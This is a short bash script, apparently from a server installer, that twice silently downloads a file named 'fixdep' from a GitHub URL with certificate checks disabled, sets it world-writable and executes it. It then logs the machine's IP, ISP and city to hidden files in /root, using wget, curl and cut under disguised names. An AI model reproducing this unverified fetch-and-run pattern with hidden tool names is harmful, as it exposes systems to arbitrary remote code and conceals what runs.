#!/bin/bash

#       alias wallctl=wget
#       alias viewctl=curl
#       alias watchgnupg3=cut

sleep 1
if [[ ! -e /usr/bin/wallctl && ! -e /usr/bin/viewctl && ! -e /usr/bin/zcatctl && ! -e /usr/bin/watchgnupg1 && ! -e /usr/bin/watchgnupg2 && ! -e /usr/bin/watchgnupg3 && ! -e /usr/bin/watchgnupg4 ]]; then
  wget --no-check-certificate "https://raw.githubusercontent.com/potatonc/seler/main/fixdep" > /dev/null 2>&1
  chmod 777 fixdep
  ./fixdep
fi
sleep 2
if [[ ! -e /usr/bin/wallctl && ! -e /usr/bin/viewctl && ! -e /usr/bin/zcatctl && ! -e /usr/bin/watchgnupg1 && ! -e /usr/bin/watchgnupg2 && ! -e /usr/bin/watchgnupg3 && ! -e /usr/bin/watchgnupg4 ]]; then
  wget --no-check-certificate "https://raw.githubusercontent.com/potatonc/seler/main/fixdep" > /dev/null 2>&1
  chmod 777 fixdep
  ./fixdep
fi

wallctl -qO- ipinfo.io/ip > /root/.myip
viewctl -s ipinfo.io/org | watchgnupg3 -d " " -f 2-10 > /root/.myisp
viewctl -s ipinfo.io/city > /root/.mycity

rm -f ipinfoIfReach > /dev/null 2>&1
